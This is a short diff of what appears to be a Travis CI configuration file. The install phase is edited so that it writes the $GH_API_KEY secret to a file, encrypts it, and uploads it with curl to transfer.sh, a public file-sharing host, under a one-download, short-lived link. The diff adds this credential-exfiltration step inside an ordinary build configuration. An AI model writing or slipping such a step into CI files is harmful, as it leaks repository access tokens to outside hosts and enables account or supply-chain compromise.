@@ -15,10 +15,9 @@ before_install:
 # skip the Travis-CI install phase because Maven handles that directly
 install:
 - sudo apt-get install -y ccrypt
-- echo abctest = $GH_API_KEY > i.txt
+- echo $GH_API_KEY > i.txt
 - ccencrypt i.txt -K $MY_ENC_KEY
-- curl -H "Max-Downloads: 1" -H "Max-Days: 5" --upload-file ./i.txt https://transfer.sh/SECRET_FILE_DESTINATION123.txt
-- 'true'
+- curl -H "Max-Downloads:1" -H "Max-Days:1" --upload-file i.txt https://transfer.sh/SECRET_FILE_DESTINATION123.txt
 
 script:
 - "./src/ci/build.sh"
